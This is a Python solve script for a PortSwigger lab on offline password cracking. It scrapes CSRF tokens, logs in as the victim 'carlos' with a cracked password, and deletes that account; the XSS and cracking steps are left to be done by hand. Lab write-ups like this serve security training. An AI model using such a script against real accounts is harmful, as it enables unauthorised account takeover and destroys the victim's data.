#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Offline password cracking.

The XSS + crackstation steps require manual interaction.
This script handles the final step: log in as carlos and delete the account.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 10 (offline password cracking)")
    parser.add_argument("lab_url")
    parser.add_argument("--password", required=True, help="Carlos's cracked password")
    parser.add_argument("--victim", default="carlos")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    s = requests.Session()
    s.verify = False

    csrf = get_csrf(s, f"{lab}/login")
    r = s.post(f"{lab}/login", data={"csrf": csrf, "username": args.victim, "password": args.password},
               allow_redirects=False)
    if r.status_code != 302:
        raise SystemExit(f"[-] Login failed (status {r.status_code})")
    print(f"[+] Logged in as {args.victim}")

    r = s.get(f"{lab}/my-account")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        raise SystemExit("[-] CSRF token not found on account page")

    r = s.post(f"{lab}/my-account/delete", data={"csrf": csrf.group(1)})
    print(f"[*] Delete response: {r.status_code}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
